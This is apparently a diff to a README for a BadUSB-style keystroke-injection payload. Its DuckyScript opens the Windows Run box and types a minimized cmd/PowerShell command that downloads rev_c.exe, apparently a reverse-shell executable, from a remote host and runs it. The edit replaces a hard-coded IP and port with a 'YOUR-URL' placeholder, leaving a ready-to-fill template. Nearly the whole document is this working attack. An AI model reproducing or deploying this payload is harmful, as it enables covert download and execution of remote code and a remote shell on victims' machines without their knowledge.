@@ -8,6 +8,6 @@ The only visible part is opening run and typing this single line of code, a comm
 ```
 GUI R
 DELAY 2000
-STRING cmd /C "start /MIN cmd /C powershell Invoke-WebRequest -Uri http://10.0.0.46:1389/rev_c.exe -OutFile $env:temp/rev_c.exe ; Start-Process $env:temp/rev_c.exe"
+STRING cmd /C "start /MIN cmd /C powershell Invoke-WebRequest -Uri http://YOUR-URL/rev_c.exe -OutFile $env:temp/rev_c.exe ; Start-Process $env:temp/rev_c.exe"
 ENTER
 ```
